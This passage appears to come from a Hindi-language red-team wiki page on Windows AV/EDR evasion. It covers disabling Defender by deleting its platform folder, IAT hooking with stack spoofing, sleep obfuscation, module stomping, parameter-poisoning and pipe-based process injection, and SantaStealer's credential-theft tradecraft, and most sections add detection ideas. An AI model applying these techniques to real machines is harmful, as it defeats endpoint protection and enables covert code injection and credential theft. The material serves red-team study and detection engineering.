- DLL sideloading/code execution: उन DLLs को drop/replace करें जिन्हें Defender अपने application directory से load करता है, ताकि Defender की processes में code execute हो। ऊपर दिया गया section देखें: [DLL Sideloading & Proxying](#dll-sideloading--proxying)।
- Service kill/denial: version-symlink हटाएँ, ताकि अगली बार start होने पर configured path resolve न हो और Defender start न हो पाए:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> ध्यान दें कि यह technique अपने आप privilege escalation प्रदान नहीं करती; इसके लिए admin rights आवश्यक हैं।

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams runtime evasion को C2 implant से हटाकर सीधे target module में ले जा सकती हैं। इसके लिए वे उसके Import Address Table (IAT) को hook करके चुने गए APIs को attacker-controlled, position-independent code (PIC) के ज़रिए route करती हैं। इससे evasion उन छोटे API surface से आगे सामान्यीकृत हो जाता है जिन्हें कई kits expose करती हैं (जैसे, CreateProcessA), और यही protections BOFs और post-exploitation DLLs तक भी पहुँचती हैं।<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

उच्च-स्तरीय तरीका
- Reflective loader (prepend या companion) का उपयोग करके target module के साथ PIC blob stage करें। PIC self-contained और position-independent होना चाहिए।
- Host DLL लोड होते समय, उसके IMAGE_IMPORT_DESCRIPTOR को traverse करें और targeted imports (जैसे, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) की IAT entries को thin PIC wrappers की ओर point करने के लिए patch करें।
- प्रत्येक PIC wrapper, real API address को tail-call करने से पहले evasions चलाता है। सामान्य evasions में शामिल हैं:
  - Call के दौरान memory को mask/unmask करना (जैसे, beacon regions को encrypt करना, RWX→RX करना, page names/permissions बदलना), फिर call के बाद उन्हें restore करना।
  - Call-stack spoofing: एक benign stack बनाना और target API में transition करना, ताकि call-stack analysis में अपेक्षित frames दिखाई दें।<sup>[[9]](#references)</sup>
- Compatibility के लिए, एक interface export करें, ताकि Aggressor script (या उसके समकक्ष) यह register कर सके कि Beacon, BOFs और post-ex DLLs के लिए किन APIs को hook करना है।

यहाँ IAT hooking क्यों
- यह ऐसे किसी भी code के लिए काम करता है जो hooked import का उपयोग करता है; इसके लिए tool code को modify करने या Beacon पर specific APIs को proxy करने के लिए निर्भर रहने की ज़रूरत नहीं होती।
- Post-ex DLLs को cover करता है: LoadLibrary* को hook करने से आप module loads (जैसे, System.Management.Automation.dll, clr.dll) को intercept कर सकते हैं और उनके API calls पर वही masking/stack evasion लागू कर सकते हैं।
- CreateProcessA/W को wrap करके, call-stack–based detections के विरुद्ध process-spawning post-ex commands का भरोसेमंद उपयोग फिर से संभव बनाता है।

न्यूनतम IAT hook रूपरेखा (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
नोट्स
- Relocations/ASLR के बाद और import के पहले उपयोग से पहले patch लागू करें। TitanLdr/AceLdr जैसे reflective loaders, लोड किए गए module के DllMain के दौरान hooking करने के उदाहरण हैं।
- Wrappers को छोटा और PIC-safe रखें; patching से पहले capture की गई original IAT value या LdrGetProcedureAddress के ज़रिए वास्तविक API resolve करें।
- PIC के लिए RW → RX transitions का उपयोग करें और writable+executable pages को खुला न छोड़ें।

Call‑stack spoofing stub
- Draugr‑style PIC stubs एक fake call chain बनाते हैं (benign modules के भीतर return addresses) और फिर वास्तविक API में pivot करते हैं।
- इससे वे detections विफल हो जाते हैं जो Beacon/BOFs से sensitive APIs तक canonical stacks की अपेक्षा करते हैं।
- API prologue से पहले expected frames के भीतर पहुँचने के लिए इसे stack cutting/stack stitching techniques के साथ जोड़ें।

Operational integration
- Reflective loader को post-ex DLLs के आगे जोड़ें, ताकि DLL लोड होने पर PIC और hooks अपने-आप initialize हों।
- Target APIs register करने के लिए Aggressor script का उपयोग करें, ताकि Beacon और BOFs बिना code changes के उसी evasion path से पारदर्शी रूप से लाभ उठा सकें।

Detection/DFIR संबंधी विचार
- IAT integrity: ऐसी entries जो non-image (heap/anon) addresses पर resolve होती हैं; import pointers का समय-समय पर verification।
- Stack anomalies: ऐसे return addresses जो loaded images से संबंधित न हों; non-image PIC में अचानक transitions; असंगत RtlUserThreadStart ancestry।
- Loader telemetry: IAT में in-process writes, import thunks को modify करने वाली शुरुआती DllMain activity, load के समय बने अप्रत्याशित RX regions।
- Image-load evasion: यदि LoadLibrary* को hook किया गया हो, तो memory masking events से संबंधित automation/clr assemblies के संदिग्ध loads को monitor करें।

संबंधित building blocks और उदाहरण
- ऐसे Reflective loaders जो load के दौरान IAT patching करते हैं (जैसे, TitanLdr, AceLdr)
- Memory masking hooks (जैसे, simplehook) और stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stubs (जैसे, Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Resident PICO के ज़रिए import-time IAT hooks

यदि आपका नियंत्रण किसी reflective loader पर है, तो `ProcessImports()` **के दौरान** loader के `GetProcAddress` pointer को एक custom resolver से बदलकर imports को hook कर सकते हैं, जो पहले hooks जाँचता है:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- एक **resident PICO** (persistent PIC object) बनाएँ, जो transient loader PIC के स्वयं को free करने के बाद भी बना रहे।
- `setup_hooks()` function export करें, जो loader के import resolver को overwrite करे (उदाहरण के लिए, `funcs.GetProcAddress = _GetProcAddress`)।
- `_GetProcAddress` में ordinal imports को छोड़ें और `__resolve_hook(ror13hash(name))` जैसा hash-based hook lookup इस्तेमाल करें। अगर hook मौजूद हो, तो उसे return करें; अन्यथा वास्तविक `GetProcAddress` को delegate करें।
- Crystal Palace में link time पर `addhook "MODULE$Func" "hook"` entries के साथ hook targets register करें। Hook valid रहता है क्योंकि वह resident PICO के भीतर रहता है।

इससे load के बाद loaded DLL के code section को patch किए बिना **import-time IAT redirection** मिलती है।

### जब target PEB-walking का उपयोग करे, तब hookable imports लागू करना

Import-time hooks तभी trigger होते हैं, जब function वास्तव में target के IAT में हो। यदि कोई module PEB-walk + hash के ज़रिए APIs resolve करता है (और import entry नहीं होती), तो एक वास्तविक import जोड़ें, ताकि loader का `ProcessImports()` path उसे देख सके:

- Hashed export resolution (जैसे, `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) को `&WaitForSingleObject` जैसे direct reference से बदलें।
- Compiler एक IAT entry emit करता है, जिससे reflective loader द्वारा imports resolve किए जाने पर interception संभव होता है।

### `Sleep()` को patch किए बिना Ekko-style sleep/idle obfuscation

`Sleep` को patch करने के बजाय, implant द्वारा उपयोग किए जाने वाले **वास्तविक wait/IPC primitives** (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`) को hook करें। लंबे waits के लिए, idle के दौरान in-memory image को encrypt करने वाली Ekko-style obfuscation chain में call को wrap करें:<sup>[[31]](#references)[[27]](#references)</sup>

- Callbacks का एक sequence schedule करने के लिए `CreateTimerQueueTimer` का उपयोग करें, जो crafted `CONTEXT` frames के साथ `NtContinue` को call करें।
- सामान्य chain (x64): image को `PAGE_READWRITE` पर सेट करें → पूरी mapped image पर `advapi32!SystemFunction032` के ज़रिए RC4 encrypt करें → blocking wait करें → RC4 decrypt करें → PE sections को traverse करके **per-section permissions restore करें** → completion signal करें।
- `RtlCaptureContext` एक template `CONTEXT` देता है; उसे कई frames में clone करें और हर step invoke करने के लिए registers (`Rip/Rcx/Rdx/R8/R9`) सेट करें।

Operational विवरण: लंबे waits (उदाहरण के लिए, `WAIT_OBJECT_0`) के लिए “success” return करें, ताकि image masked रहते हुए caller आगे बढ़े। यह pattern idle windows के दौरान module को scanners से छिपाता है और classic “patched `Sleep()`” signature से बचता है।

Detection के विचार (telemetry-based)
- `NtContinue` की ओर इंगित करने वाले `CreateTimerQueueTimer` callbacks के bursts।
- बड़े contiguous image-sized buffers पर `advapi32!SystemFunction032` का उपयोग।
- बड़े-range `VirtualProtect` के बाद custom per-section permission restoration।

### Sleep-obfuscation gadgets के लिए runtime CFG registration

CFG-enabled targets पर, `jmp [rbx]` या `jmp rdi` जैसे mid-function gadget में पहला indirect jump आम तौर पर process को `STATUS_STACK_BUFFER_OVERRUN` के साथ crash कर देगा, क्योंकि gadget module के CFG metadata में मौजूद नहीं होता। Hardened processes में Ekko/Kraken-style chains को चलाए रखने के लिए:<sup>[[30]](#references)</sup>

- Chain द्वारा उपयोग किए जाने वाले हर indirect destination को `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` और `CFG_CALL_TARGET_VALID` entries के साथ register करें।
- Loaded images (`ntdll`, `kernel32`, `advapi32`) के अंदर के addresses के लिए, `MEMORY_RANGE_ENTRY` को **image base** से शुरू होना चाहिए और **पूरे image size** को cover करना चाहिए।
- Manually mapped/PIC/stomped regions के लिए, इसके बजाय **allocation base** और allocation size का उपयोग करें।
- केवल dispatch gadget ही नहीं, बल्कि indirectly पहुँचने वाले exports (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls) और attacker-controlled executable sections को भी mark करें, जो indirect targets बनेंगे।

इससे ROP/JOP-style sleep chains “केवल non-CFG processes में काम करती हैं” वाली स्थिति से आगे बढ़कर `explorer.exe`, browsers, `svchost.exe` और `/guard:cf` के साथ compile किए गए अन्य endpoints के लिए reusable primitive बन जाती हैं।

### Sleeping threads के लिए CET-safe stack spoofing

Full `CONTEXT` replacement noisy होता है और CET Shadow Stack systems पर विफल हो सकता है, क्योंकि spoofed `Rip` को hardware shadow stack से मेल खाना चाहिए। Sleep-masking का एक अधिक सुरक्षित pattern यह है:<sup>[[30]](#references)</sup>

- उसी process में कोई दूसरा thread चुनें और `NtQueryInformationThread` के ज़रिए उसकी `NT_TIB` / TEB stack bounds (`StackBase`, `StackLimit`) पढ़ें।
- मौजूदा thread का वास्तविक TEB/TIB backup करें।
- `GetThreadContext` से वास्तविक sleeping context capture करें।
- Spoof context में **केवल** वास्तविक `Rip` copy करें; spoofed `Rsp`/stack state को जस का तस छोड़ें।
- Sleep window के दौरान, spoof thread का `NT_TIB` मौजूदा TEB में copy करें, ताकि stack walkers एक वैध stack range के भीतर unwind करें।
- Wait पूरा होने पर, original TIB और thread context restore करें।

इससे CET-संगत instruction pointer बना रहता है, जबकि उन EDR stack walkers को भ्रमित किया जाता है जो unwinds validate करने के लिए TEB stack metadata पर भरोसा करते हैं।

### APC-based विकल्प: Kraken Mask

यदि timer-queue dispatch की signature बहुत स्पष्ट हो, तो वही sleep-encrypt-spoof-restore sequence queued APCs का उपयोग करके suspended helper thread से चलाया जा सकता है:<sup>[[27]](#references)</sup>

- Entry point के रूप में `NtTestAlert` वाला helper thread बनाएँ।
- `NtQueueApcThread` से तैयार `CONTEXT` frames/APCs queue करें और `NtAlertResumeThread` से उन्हें drain करें।
- Default 64 KB thread stack को exhaust होने से बचाने के लिए chain state को helper stack के बजाय heap पर store करें।
- Start event को atomically signal करने और block करने के लिए `NtSignalAndWaitForSingleObject` का उपयोग करें।
- TIB/context restore करने से पहले main thread को suspend करें (`NtSuspendThread` → restore → `NtResumeThread`), ताकि scanner द्वारा आधे-restored stack को पकड़ने की race window कम हो।

इससे वही RC4 masking और stack-spoofing लक्ष्य बनाए रखते हुए `CreateTimerQueueTimer` + `NtContinue` signature की जगह helper-thread/APC signature आ जाती है।

अतिरिक्त detection के विचार
- Sleeps, waits या APC dispatch से ठीक पहले `VmCfgCallTargetInformation` के साथ `NtSetInformationVirtualMemory` का उपयोग।
- `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` या `ConnectNamedPipe` के आसपास `GetThreadContext`/`SetThreadContext` का उपयोग।
- `NtQueryInformationThread` के बाद मौजूदा thread की TEB/TIB stack bounds में सीधे writes।
- `NtQueueApcThread`/`NtAlertResumeThread` chains, जो अप्रत्यक्ष रूप से `SystemFunction032`, `VirtualProtect` या section-permission restoration helpers तक पहुँचती हैं।
- Signed modules के अंदर dispatch pivots के रूप में `FF 23` (`jmp [rbx]`) या `FF E7` (`jmp rdi`) जैसी छोटी gadget signatures का बार-बार उपयोग।


## Precision Module Stomping

Module stomping payloads को **target process के भीतर पहले से mapped DLL के `.text` section से** execute करता है, बजाय स्पष्ट private executable memory allocate करने या नई sacrificial DLL load करने के। Overwrite target एक **loaded, disk-backed image** होना चाहिए, जिसके code space में payload समा सके और process के लिए ज़रूरी code paths corrupt न हों।<sup>[[1]](#references)[[2]](#references)</sup>

### विश्वसनीय target चयन

`uxtheme.dll` या `comctl32.dll` जैसे आम modules पर naive stomping करना नाज़ुक होता है: DLL remote process में load न हुई हो सकती है और code region बहुत छोटा होने पर process crash हो सकता है। अधिक विश्वसनीय workflow:

1. Target process के modules enumerate करें और पहले से loaded DLLs की **केवल names वाली include list** रखें।
2. पहले payload बनाएँ और उसका **सटीक byte size** दर्ज करें।
3. Disk पर candidate DLLs scan करें और PE section **`.text` `Misc_VirtualSize`** की तुलना payload size से करें। यह file size से अधिक महत्वपूर्ण है, क्योंकि यह executable section का **memory में map होने पर** आकार दर्शाता है।
4. **Export Address Table (EAT)** parse करें और stomp के start offset के रूप में किसी exported function RVA को चुनें।
5. **Blast radius** की गणना करें: यदि payload चुने हुए function boundary से बड़ा हुआ, तो वह memory में उसके बाद रखे adjacent exports को overwrite कर देगा।

आमतौर पर देखे जाने वाले recon/selection helpers:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Operational notes
- `LoadLibrary`/unexpected image loads की telemetry से बचने के लिए remote process में **पहले से loaded** DLLs को प्राथमिकता दें।
- ऐसे exports को प्राथमिकता दें जिन्हें target application शायद ही कभी execute करता हो; अन्यथा thread creation से पहले या बाद में सामान्य code paths stomped bytes तक पहुँच सकते हैं।
- बड़े implants के लिए अक्सर shellcode embedding को string literal से **byte-array/braced initializer** में बदलना पड़ता है, ताकि injector source में पूरा buffer सही तरह से दर्शाया जा सके।

Detection ideas
- अधिक सामान्य private RWX/RX allocations के बजाय **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) में remote writes।
- ऐसे export entry points जिनके in-memory bytes अब disk पर मौजूद backing file से मेल नहीं खाते।
- ऐसे remote threads या context pivots जो किसी legitimate DLL export के भीतर execution शुरू करते हैं, जिसके शुरुआती bytes हाल ही में संशोधित किए गए हों।
- DLL `.text` pages पर `VirtualProtect(Ex)` / `WriteProcessMemory` के संदिग्ध sequences, जिनके बाद thread creation हो।

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) एक **process-injection / EDR-evasion** technique है, जो classic remote write path (`VirtualAllocEx` + `WriteProcessMemory`) से बचती है। पहले से चल रहे target में bytes copy करने के बजाय, यह इस तथ्य का दुरुपयोग करती है कि Windows **चुने हुए `CreateProcessW` startup parameters को child process में copy करता है** और उन्हें `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`) के अंदर रखता है।<sup>[[28]](#references)[[29]](#references)</sup>

### `CreateProcessW` द्वारा कॉपी किए जाने वाले Poisonable carriers

उपयोगी carriers हैं:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (`CREATE_UNICODE_ENVIRONMENT` के साथ) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

व्यावहारिक carrier सीमाएँ:

- `lpCommandLine` को `CreateProcessW` के लिए **writable memory** की ओर point करना चाहिए, और इसकी सीमा null terminator सहित **32,767 Unicode characters** है।
- `lpEnvironment` successive `NAME=VALUE\0` strings वाला Unicode environment block होना चाहिए, जिसके अंत में एक अतिरिक्त `\0` हो।
- `lpReserved` आधिकारिक तौर पर reserved है, इसलिए `ShellInfo` mapping को स्थिर documented contract के बजाय implementation detail मानना चाहिए।

इससे सामान्य process creation **payload-transfer primitive** बन जाता है। Operator attacker-controlled startup data के साथ child process बनाता है और Windows को cross-process copy करने देता है।

### Remote write APIs के बिना Remote lookup flow

Child बनने के बाद, **read-only** primitives से कॉपी किए गए buffer का पता लगाएँ:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` प्राप्त करें
2. Remote `PEB` पढ़ें
3. `PEB.ProcessParameters` को follow करें
4. `RTL_USER_PROCESS_PARAMETERS` पढ़ें
5. चुने हुए pointer का उपयोग करें:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

न्यूनतम flow:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### कॉपी किए गए parameter buffer को execute करना

कॉपी किया गया parameter region आम तौर पर `RW` होता है, executable नहीं। एक सामान्य P3 chain यह है:

1. Process को सामान्य तरीके से बनाएँ (suspended नहीं)
2. `NtProtectVirtualMemory` / `VirtualProtectEx` से चुने गए parameter page को executable बनाएँ
3. `PROCESS_INFORMATION` में पहले से लौटाए गए main thread handle का फिर से उपयोग करें
4. `NtSetContextThread` (`CONTEXT_CONTROL`, `RIP` को overwrite करें) से execution redirect करें

Classic thread hijacking workflows के विपरीत, इसके लिए `SuspendThread` / `ResumeThread` की **ज़रूरत नहीं होती**; लौटाए गए main thread handle पर सीधे context बदला जा सकता है।

इससे injection के लिए आम तौर पर monitor की जाने वाली कई APIs से बचा जा सकता है:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- अक्सर `SuspendThread` / `ResumeThread` से भी

### Null-byte की सीमा और staged shellcode

तीनों carriers **string या string-जैसे data** होते हैं, इसलिए `0x00` वाला raw payload transfer के दौरान truncate हो जाता है। इसका एक व्यावहारिक उपाय है ऐसा **null-free first stage** जो runtime पर constants को फिर से बनाए और फिर कोई भी arbitrary second stage load करे।

एक सरल pattern XOR-आधारित constant synthesis है:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

इससे first stage transported parameter में null bytes embed किए बिना stack strings, API arguments, DLL paths या second-stage shellcode loader बना सकता है।

### First stage से stack-based API calls

जब first stage को `LoadLibraryA` जैसे APIs call करने हों, तो यह:

- target stack पर string/buffer push कर सकता है
- **32-byte x64 shadow space** reserve कर सकता है
- `RCX`, `RDX`, `R8`, `R9` को constants या `RSP`-relative pointers पर set कर सकता है
- call से पहले `RSP` को **16-byte aligned** रख सकता है

इसके बाद second stage को stack से `PAGE_READWRITE` allocation में copy किया जा सकता है, `VirtualProtect` से `PAGE_EXECUTE_READ` में बदला जा सकता है और उस पर jump किया जा सकता है—इससे सीधे RWX allocation से बचा जा सकता है।

### Detection ideas

लेखकों द्वारा बताए गए अच्छे hunting अवसर:

- `VirtualProtectEx` / `NtProtectVirtualMemory` द्वारा **process-parameter pages को executable बनाना**
- उस protection change के बाद `SetThreadContext` / `NtSetContextThread का इस्तेमाल`
- `PEB` और फिर `RTL_USER_PROCESS_PARAMETERS` की remote reads
- process creation के दौरान असामान्य रूप से लंबे / high-entropy `lpCommandLine`, `lpEnvironment` या `STARTUPINFO.lpReserved` values

### Notes

- P3 एक **cross-process transfer trick** है, अपने आप में पूर्ण execution primitive नहीं: copy किए गए parameter को अब भी execute permission change और execution redirection method की ज़रूरत होती है।
- लेखकों ने `RtlCreateProcessReflection` / Dirty Vanity पर विचार किया, लेकिन इसे अस्वीकार कर दिया क्योंकि यह internally `NtWriteVirtualMemory` और `NtCreateThreadEx` जैसे संदिग्ध primitives तक पहुँचता है।

Thread descriptions के ज़रिए किसी **मौजूदा** Windows process में payload delivery और फिर waiting-thread return-address hijacking के लिए, [Thread Name-Calling and Waiting Thread Hijacking](windows-process-injection-thread-name-calling-waiting-thread-hijacking.md) देखें।

## Console STDIN pipe injection

एक interactive console child को **payload-transfer primitive** के रूप में भी इस्तेमाल किया जा सकता है। Injector child के standard input को pipe पर redirect करता है और marker के बाद shellcode भेजता है। Console program द्वारा data को अपनी private memory में पढ़ लेने के बाद, injector उस buffer को ढूँढ़ता है, उसे executable बनाता है और child thread को उस पर redirect करता है। इससे `VirtualAllocEx` और `WriteProcessMemory` से बचा जा सकता है, लेकिन यह अब भी process injection है, general EDR bypass नहीं।<sup>[[41]](#references)</sup>

"named-pipe" विवरण के बावजूद, reference implementation `CreatePipe` call करता है, जो **anonymous pipe** बनाता है। Windows internally anonymous pipes को uniquely named pipe objects के रूप में implement करता है, लेकिन PoC न तो `\\.\pipe\<name>` path चुनता है और न ही `CreateNamedPipe` call करता है। यह default security descriptor के साथ inheritable handles बनाता है, read handle को `STARTUPINFO.hStdInput` में रखता है, `STARTF_USESTDHANDLES` set करता है और handle inheritance enabled करके नया child launch करता है। इसलिए यह PoC दिए गए console executable को launch करता है; यह अपने pipe को किसी मौजूदा process से attach नहीं करता।<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Reference workflow

Implementation यह chain इस्तेमाल करता है:<sup>[[41]](#references)</sup>

1. Child के `STDIN` और `STDOUT` के लिए anonymous pipe pairs बनाएँ। Parent-side के दोनों handles से inheritance clear करें और process creation के बाद parent में child-side duplicates बंद करें।
2. `CREATE_NEW_CONSOLE` के साथ `netsh.exe` या `nslookup.exe` जैसे interactive executable को launch करें। Child redirected standard handles inherit करता है।
3. Parent-side `STDIN` handle के ज़रिए `WriteFile` से पूरा binary `rawData` array भेजें। Console program bytes consume करता है और अपनी private committed regions में से किसी एक में एक copy छोड़ता है।
4. `VirtualQueryEx` से child के address space को walk करें, `ReadProcessMemory` से candidate `MEM_PRIVATE` regions पढ़ें और `rawData` की शुरुआत में marker खोजें।
5. `VirtualProtectEx` से मिले हुए buffer को `PAGE_EXECUTE_READWRITE` में बदलें।
6. Main thread पहचानें, उसे suspend करें, `NtSetContextThread` से `RIP` को `found_address + 0x19` पर set करें और उसे resume करें।

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

दिया गया implementation x64-specific है: यह `CONTEXT.Rip` को संशोधित करता है, और इसमें embedded payload x64 shellcode है। `rawData` की शुरुआत 25-byte marker से होती है, इसलिए executable bytes hexadecimal offset `0x19` से शुरू होते हैं। Payload बदलते समय इस layout को बनाए रखें, या marker, search vector, array size और execution offset—सभी को एक साथ अपडेट करें। Source comments में `0x0A`, `0x0D` और `0x1A` को bad characters भी बताया गया है। यह workflow child का token या privileges नहीं बदलता।<sup>[[41]](#references)</sup>

छोटे native helpers और payload compilation patterns के लिए, [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md) देखें।

## Shellcode के बिना thread-pool callback DLL injection (DLLParty)

DLLParty, PoolParty-style thread-pool injection को इस तरह अपनाता है कि मौजूदा target worker injected callback stub को execute करने के बजाय `LoadLibraryA` call करे। इसका dispatch primitive, target pool के I/O completion port पर queued `TP_DIRECT` completion है। इससे process permissions bypass नहीं होते: PoC `OpenProcess(PROCESS_ALL_ACCESS)` call करता है और उसे readable/writable target memory तथा duplicable worker-factory और completion-port handles की ज़रूरत होती है।<sup>[[46]](#references)[[47]](#references)</sup>

Windows x64 पर, worker `RCX` में अपने stack-backed `TP_CALLBACK_INSTANCE` का pointer पास करता है, जो पहला callback argument है। `LoadLibraryA` इसी pointer को `LPCSTR` मानता है। परीक्षण किए गए path में, `TppWorkerThread` pointer को `RSP+0x178` पर बनाता है, जबकि उस object में उसका पहला सामान्य write `RSP+0x1d0` पर होता है। इसलिए, इस 0x58-byte prefix में फिट होने वाला null-terminated DLL path dispatch से पहले overwrite हुए बिना instance की शुरुआत में रखा जा सकता है। यह किसी विशिष्ट build पर किया गया अवलोकन है, Windows ABI की documented guarantee नहीं।<sup>[[46]](#references)[[47]](#references)</sup>

संदर्भ workflow यह है:<sup>[[46]](#references)[[47]](#references)</sup>

1. `NtQuerySystemInformation(SystemHandleInformation)` से target के handles enumerate करें और object types query करके `TpWorkerFactory` पहचानें। Worker-factory handle duplicate करें और `WorkerFactoryBasicInformation` query करें; `StartParameter` से remote `TP_POOL` मिलता है। `TotalWorkerCount == 0` वाली factories को छोड़ दें।
2. `TP_POOL.CompletionPort` पढ़ें और pool की private worker list को traverse करें। परीक्षण किए गए Windows 10 19045 x64 build (`ntdll.dll 10.0.19041.4842`) में, इसका head `pool+0x60` पर है; हर link `worker+0x10` पर है, इसलिए `worker+0x38` पर callback-instance slot, `link+0x28` के बराबर है। PoC pointer alignment, link reciprocity, pool ownership, nonzero thread IDs, repeated nodes और stable list head की जाँच करता है।
3. DLL path को हर recovered worker slot में लिखें, क्योंकि queued completion को कोई भी worker consume कर सकता है। Writable target memory में `Callback = LoadLibraryA` वाला `TP_DIRECT` रखें। PoC `VirtualAllocEx` के बजाय worker stack पर `last_slot-0x500` का उपयोग करता है; यह offset experimental है और active stack data से टकराना नहीं चाहिए।
4. Target completion-port handle duplicate करें और `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)` call करें। Remote `TP_DIRECT` address completion key है। इसके बाद कोई मौजूदा worker, overwrite किए गए callback-instance pointer के साथ `LoadLibraryA` invoke करता है और target के लिए पहले से accessible DLL load करता है।

PoC target PID (`DLLParty.exe <target_pid>`) लेता है और `DLLParty.cpp` में hard-coded DLL path का उपयोग करता है; x64 executable बनाने से पहले ऐसा path सेट करें जो target के लिए accessible हो। यह अपने process के `LoadLibraryA` address को remote callback के रूप में भी इस्तेमाल करता है, इसलिए मानता है कि वह address target में valid है। Code, path की length को 0x58-byte prefix से नहीं जाँचता और न ही यह सुनिश्चित करता है कि worker traversal को indexing से पहले कोई slot मिला है। Target build के लिए private offsets, stack layout और writable space को फिर से verify करें। `CreateRemoteThreadEx`, shellcode और `VirtualAllocEx` का उपयोग न करने से cross-process writes या DLL-load telemetry समाप्त नहीं होते।<sup>[[46]](#references)[[47]](#references)</sup>

## Fileless evasion और credential theft के लिए SantaStealer tradecraft

SantaStealer (उर्फ BluelineStealer) दिखाता है कि आधुनिक info-stealers एक ही workflow में AV bypass, anti-analysis और credential access को कैसे जोड़ते हैं।<sup>[[24]](#references)</sup>

### Keyboard layout gating और sandbox delay

- एक config flag (`anti_cis`), `GetKeyboardLayoutList` के ज़रिए installed keyboard layouts को enumerate करता है। अगर Cyrillic layout मिलता है, तो sample एक खाली `CIS` marker छोड़ता है और stealers चलाने से पहले terminate हो जाता है। इससे वह excluded locales पर detonate नहीं होता, जबकि hunting artifact मौजूद रहता है।

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Layered `check_antivm` logic

- Variant A process list को scan करता है, हर नाम का custom rolling checksum निकालता है और उसे debuggers/sandboxes की embedded blocklists से मिलाता है; फिर computer name पर checksum दोहराता है और `C:\analysis` जैसी working directories की जाँच करता है।
- Variant B system properties की जाँच करता है (process-count floor, हाल का uptime), VirtualBox additions का पता लगाने के लिए `OpenServiceA("VBoxGuest")` कॉल करता है और single-stepping का पता लगाने के लिए sleeps के आसपास timing checks करता है। कोई भी संकेत मिलने पर modules लॉन्च होने से पहले प्रक्रिया रोक दी जाती है।

### Fileless helper + double ChaCha20 reflective loading

- Primary DLL/EXE में Chromium credential helper embedded होता है, जिसे या तो disk पर drop किया जाता है या memory में manually map किया जाता है; fileless mode में यह स्वयं imports/relocations resolve करता है, इसलिए helper के कोई artifacts नहीं लिखे जाते।
- यह helper दूसरे चरण के DLL को ChaCha20 से दो बार encrypted करके रखता है (दो 32-byte keys + 12-byte nonces)। दोनों passes के बाद, यह blob को reflectively load करता है (`LoadLibrary` के बिना) और [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) से लिए गए exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` को कॉल करता है।<sup>[[25]](#references)</sup>
- ChromElevator routines direct-syscall reflective process hollowing का उपयोग करके live Chromium browser में inject करते हैं, AppBound Encryption keys विरासत में लेते हैं और ABE hardening के बावजूद SQLite databases से सीधे passwords/cookies/credit cards decrypt करते हैं।

### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log` global `memory_generators` function-pointer table पर iterate करता है और हर enabled module (Telegram, Discord, Steam, screenshots, documents, browser extensions आदि) के लिए एक thread शुरू करता है। हर thread साझा buffers में results लिखता है और लगभग 45s की join window के बाद अपनी file count की रिपोर्ट करता है।
